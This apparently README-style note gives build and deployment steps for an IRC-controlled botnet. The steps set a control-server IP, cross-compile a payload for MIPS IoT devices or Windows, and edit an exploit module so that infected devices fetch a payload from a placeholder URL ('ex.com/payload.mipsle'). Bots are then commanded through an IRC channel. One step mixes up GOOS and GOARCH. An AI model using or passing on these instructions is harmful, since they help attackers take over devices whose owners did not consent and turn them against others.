- Build the payload
1. Change main.go IP
2. set GOOS=linux on Linux and GOOS=windows on Windows
3. set GOARCH=mipsle on Linux and GOOS=amd64 on Windows
4. go build .

-Loading bots
1. cd sploit
2. Replace iot.go 'http://ex.com/payload.mipsle' with a payload file included

You can use an IRC client such as mIRC to access the main (#test) channel.
